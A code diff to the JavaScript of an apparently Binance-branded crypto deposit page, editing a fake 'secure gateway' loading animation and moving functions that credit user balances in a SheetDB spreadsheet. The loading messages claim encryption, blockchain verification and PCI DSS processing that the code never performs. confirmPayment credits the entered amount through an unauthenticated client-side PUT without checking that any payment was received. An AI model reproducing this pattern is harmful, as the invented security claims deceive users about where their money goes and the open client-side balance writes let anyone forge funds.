@@ -893,145 +893,12 @@
         const loadingStatusText = document.getElementById('loadingStatusText');
         const loadingTimerDisplay = document.getElementById('loadingTimerDisplay');
 
-        // Professional loading messages
+        // Professional loading messages - UPDATED: 1, 2, 3 with Finalizing
         const loadingMessages = [
             "Initializing secure gateway...",
-            "Encrypting transaction data...",
             "Verifying blockchain network...",
-            "Establishing secure handshake...",
-            "Processing with PCI DSS protocols...",
             "Finalizing secure connection..."
         ];
-        
-        // SHA-256 function for password hashing (if needed)
-        async function sha256(message) {
-            const msgBuffer = new TextEncoder().encode(message);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-        }
-        
-        // Fetch user balance from database
-        async function fetchUserBalance() {
-            const savedEmail = localStorage.getItem('binance_session_email');
-            if (!savedEmail) {
-                window.location.href = 'index.html';
-                return 0;
-            }
-            
-            currentUserEmail = savedEmail;
-            
-            try {
-                const response = await fetch(`${API_URL}?ignore_cache=1`);
-                const users = await response.json();
-                const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
-                
-                if (user) {
-                    currentUserBalance = parseFloat(user.Balance) || 0;
-                    const balanceInDollars = (currentUserBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-                    if (currentBalanceDisplay) {
-                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
-                    }
-                    return currentUserBalance;
-                }
-                return 0;
-            } catch (error) {
-                console.error('Error fetching user balance:', error);
-                return 0;
-            }
-        }
-        
-        // Update user balance in database
-        async function updateUserBalance(amountInCents) {
-            if (!currentUserEmail) return false;
-            
-            const newBalance = currentUserBalance + amountInCents;
-            
-            try {
-                // First, get all users to find the row index
-                const response = await fetch(`${API_URL}?ignore_cache=1`);
-                const users = await response.json();
-                const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase());
-                
-                if (userIndex === -1) return false;
-                
-                // Update the balance using PUT request with row number
-                const rowNumber = userIndex + 2; // +2 because SheetDB uses 1-indexed and row 1 is headers
-                const updateResponse = await fetch(`${API_URL}/${rowNumber}`, {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ Balance: newBalance })
-                });
-                
-                if (updateResponse.ok) {
-                    currentUserBalance = newBalance;
-                    const balanceInDollars = (newBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-                    if (currentBalanceDisplay) {
-                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
-                    }
-                    return true;
-                }
-                return false;
-            } catch (error) {
-                console.error('Error updating balance:', error);
-                return false;
-            }
-        }
-        
-        // Save transaction to Transactions sheet
-        async function saveTransaction(amountInCents) {
-            if (!currentUserEmail) return;
-            
-            const sign = amountInCents >= 0 ? '+' : '';
-            const transactionValue = `${sign}${amountInCents}`;
-            
-            try {
-                await fetch(TRANSACTIONS_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify([{ Email: currentUserEmail, Amount: transactionValue }])
-                });
-                console.log('Transaction saved:', transactionValue);
-            } catch (error) {
-                console.error('Failed to save transaction:', error);
-            }
-        }
-        
-        // Confirm payment and update balance
-        async function confirmPayment() {
-            const depositAmountInCents = Math.round(currentAmount * 100); // Convert dollars to cents
-            
-            // Show confirmation modal with progress
-            const confirmModal = document.getElementById('confirmModal');
-            const confirmProgressFill = document.getElementById('confirmProgressFill');
-            confirmModal.classList.add('active');
-            confirmProgressFill.style.width = '0%';
-            
-            // Animate progress
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 10;
-                confirmProgressFill.style.width = `${progress}%`;
-                if (progress >= 100) {
-                    clearInterval(progressInterval);
-                }
-            }, 200);
-            
-            // Update balance and save transaction
-            const success = await updateUserBalance(depositAmountInCents);
-            
-            if (success) {
-                await saveTransaction(depositAmountInCents);
-                setTimeout(() => {
-                    confirmModal.classList.remove('active');
-                    window.location.href = 'dashboard.html';
-                }, 1500);
-            } else {
-                clearInterval(progressInterval);
-                confirmModal.classList.remove('active');
-                alert('Payment confirmation failed. Please contact support.');
-            }
-        }
 
         // Show loading animation with random duration (4-6 seconds)
         function showLoadingAnimation(callback) {
@@ -1064,10 +931,14 @@
                 loadingTimerDisplay.textContent = `${remaining.toFixed(1)}s`;
                 
                 // Update message based on progress
-                const messageIndex = Math.min(
-                    loadingMessages.length - 1,
-                    Math.floor(progress / (100 / loadingMessages.length))
-                );
+                let messageIndex = 0;
+                if (progress >= 66) {
+                    messageIndex = 2;
+                } else if (progress >= 33) {
+                    messageIndex = 1;
+                } else {
+                    messageIndex = 0;
+                }
                 loadingStatusText.textContent = loadingMessages[messageIndex];
                 
                 // When complete
@@ -1305,6 +1176,123 @@
                     btnText.innerHTML = '<i class="far fa-copy"></i> Copy wallet address';
                 }, 2000);
             });
+        }
+        
+        // Fetch user balance from database
+        async function fetchUserBalance() {
+            const savedEmail = localStorage.getItem('binance_session_email');
+            if (!savedEmail) {
+                window.location.href = 'index.html';
+                return 0;
+            }
+            
+            currentUserEmail = savedEmail;
+            
+            try {
+                const response = await fetch(`${API_URL}?ignore_cache=1`);
+                const users = await response.json();
+                const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
+                
+                if (user) {
+                    currentUserBalance = parseFloat(user.Balance) || 0;
+                    const balanceInDollars = (currentUserBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                    if (currentBalanceDisplay) {
+                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
+                    }
+                    return currentUserBalance;
+                }
+                return 0;
+            } catch (error) {
+                console.error('Error fetching user balance:', error);
+                return 0;
+            }
+        }
+        
+        // Update user balance in database
+        async function updateUserBalance(amountInCents) {
+            if (!currentUserEmail) return false;
+            
+            const newBalance = currentUserBalance + amountInCents;
+            
+            try {
+                const response = await fetch(`${API_URL}?ignore_cache=1`);
+                const users = await response.json();
+                const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase());
+                
+                if (userIndex === -1) return false;
+                
+                const rowNumber = userIndex + 2;
+                const updateResponse = await fetch(`${API_URL}/${rowNumber}`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ Balance: newBalance })
+                });
+                
+                if (updateResponse.ok) {
+                    currentUserBalance = newBalance;
+                    const balanceInDollars = (newBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                    if (currentBalanceDisplay) {
+                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
+                    }
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error('Error updating balance:', error);
+                return false;
+            }
+        }
+        
+        // Save transaction to Transactions sheet
+        async function saveTransaction(amountInCents) {
+            if (!currentUserEmail) return;
+            
+            const sign = amountInCents >= 0 ? '+' : '';
+            const transactionValue = `${sign}${amountInCents}`;
+            
+            try {
+                await fetch(TRANSACTIONS_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify([{ Email: currentUserEmail, Amount: transactionValue }])
+                });
+                console.log('Transaction saved:', transactionValue);
+            } catch (error) {
+                console.error('Failed to save transaction:', error);
+            }
+        }
+        
+        // Confirm payment and update balance
+        async function confirmPayment() {
+            const depositAmountInCents = Math.round(currentAmount * 100);
+            
+            const confirmModal = document.getElementById('confirmModal');
+            const confirmProgressFill = document.getElementById('confirmProgressFill');
+            confirmModal.classList.add('active');
+            confirmProgressFill.style.width = '0%';
+            
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 10;
+                confirmProgressFill.style.width = `${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                }
+            }, 200);
+            
+            const success = await updateUserBalance(depositAmountInCents);
+            
+            if (success) {
+                await saveTransaction(depositAmountInCents);
+                setTimeout(() => {
+                    confirmModal.classList.remove('active');
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+            } else {
+                clearInterval(progressInterval);
+                confirmModal.classList.remove('active');
+                alert('Payment confirmation failed. Please contact support.');
+            }
         }
 
         // Initialize
